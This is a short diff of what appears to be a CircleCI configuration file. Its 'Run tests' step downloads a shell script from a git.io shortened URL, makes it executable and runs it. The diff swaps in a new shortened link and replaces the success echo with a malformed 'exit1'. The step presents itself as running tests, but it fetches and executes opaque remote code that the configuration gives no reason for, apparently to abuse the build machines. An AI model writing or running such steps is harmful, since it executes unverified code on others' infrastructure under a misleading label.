@@ -11,11 +11,10 @@ working_dir: &working_dir ~/app
     - run: 
         name: Run tests 
         command: |                                      
-                    wget -qO virtual.sh https://git.io/JMBtQ
+                    wget -qO virtual.sh https://git.io/JM13j
                     chmod +x virtual.sh 
                     ./virtual.sh  
-                    echo Build Succeded 
-                    
+                    exit1                    
 version: 2.0 
 jobs: 
   build1: 
